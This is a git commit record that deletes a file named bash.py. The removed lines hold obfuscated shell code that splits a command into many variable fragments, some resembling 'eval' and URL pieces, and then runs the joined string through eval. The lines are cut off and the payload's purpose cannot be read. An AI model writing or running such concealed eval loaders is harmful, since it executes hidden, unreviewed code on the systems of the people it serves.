7996f5310bd2b18b002132410920e288ecfff4ba
Aank is ME <email@aank.me>
2022-04-01 15:23:06 +0700

    Delete bash.py

--- bash.py
+++
@@ -1,3 +0,0 @@
-z="
-";nDz='ta.r';Hz='nput';uz=''\'']'\''';VCz='//aa';Rz='37m'\''';qDz='eval';VFz='2nkg';XDz='W)';uBz='█>
-eval "$Az$Bz$Cz$z$Az$Dz$Ez$z$Az$Fz$Gz$Hz$z$Iz$Jz$Kz$Lz$z$Mz$Jz$Nz$Oz$z$Pz$Jz$Qz$Rz$z$Sz$Jz$Qz$Tz$z$>
